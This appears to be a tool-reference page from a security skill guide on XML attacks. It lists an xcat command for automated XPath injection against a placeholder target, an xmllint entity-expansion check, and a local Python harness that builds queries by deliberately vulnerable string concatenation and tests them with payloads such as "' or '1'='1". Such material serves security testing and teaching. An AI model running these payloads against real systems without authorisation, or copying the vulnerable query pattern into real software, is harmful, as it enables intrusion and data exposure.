# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`xml-attacks-xxe-and-xslt-xpath-and-schema`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `xcat` | `xcat run 'https://target.example/search?q=QUERY' QUERY --true-string found` | Automate boolean XPath differential confirmation against a reflected marker | Cross-platform |
| `xmllint` | `xmllint --noout --loaddtd --maxmem 50000 doc.xml` | Observe whether entity expansion is bounded by memory limits | Linux, macOS |
| `python lxml` | `python3 -c "from lxml import etree; print('ok')"` | Provide a scriptable XPath engine for local predicate-pair testing | Cross-platform |

## Minimal Script Shape

A predicate-pair harness: it evaluates a true and a false XPath predicate over a local document and reports injection when the node counts diverge.

```python
from lxml import etree

DOC = b"<accounts><user><name>carol</name><role>user</role></user></accounts>"


def nodes(tree, value):
    q = "//user[name/text()='%s']" % value   # vulnerable concatenation
    return len(tree.xpath(q))


tree = etree.fromstring(DOC)
baseline = nodes(tree, "carol")
true_pred = nodes(tree, "carol' or '1'='1")
false_pred = nodes(tree, "nope' or '1'='2")
verdict = true_pred > baseline and false_pred == 0
print({"baseline": baseline, "true_pred": true_pred,
       "false_pred": false_pred, "xpath_injectable": verdict})
```
